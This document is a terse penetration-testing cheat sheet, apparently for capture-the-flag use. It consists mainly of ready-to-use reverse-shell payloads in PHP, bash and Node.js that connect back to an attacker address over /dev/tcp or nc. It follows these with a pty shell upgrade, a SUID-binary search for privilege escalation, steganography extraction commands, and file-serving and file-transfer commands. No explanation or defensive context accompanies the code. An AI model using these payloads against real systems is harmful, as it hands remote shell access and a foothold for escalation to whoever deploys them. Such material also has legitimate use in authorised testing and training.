### Reverse Shell Payloads

```php
<?php
$ip = '192.168.1.10';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'");
?>
```

```bash
echo 'bash -i >& /dev/tcp/IP/5555 0>&1' > script.sh
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 > /tmp/f" > script.sh
```

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/IP/5555 0>&1' > script.sh
```

```js
require("child_process").exec(
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc IP 4444 >/tmp/f"
);
```

### Shell Upgrade:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Steganography

```bash
exiftool fileName.jpg
steghide extract -sf fileName.jpg
binwalk -e fileName.png
```

Binwalk fix:

```bash
sed -i 's/CS_ARCH_ARM64/CS_ARCH_AARCH64/g' /usr/lib/python3/dist-packages/binwalk/modules/disasm.py
```

### Python Simple Server

```bash
python -m SimpleHTTPServer
```

### Secure File Transfer

```bash
scp userName@IP:fileName.jpg .
```
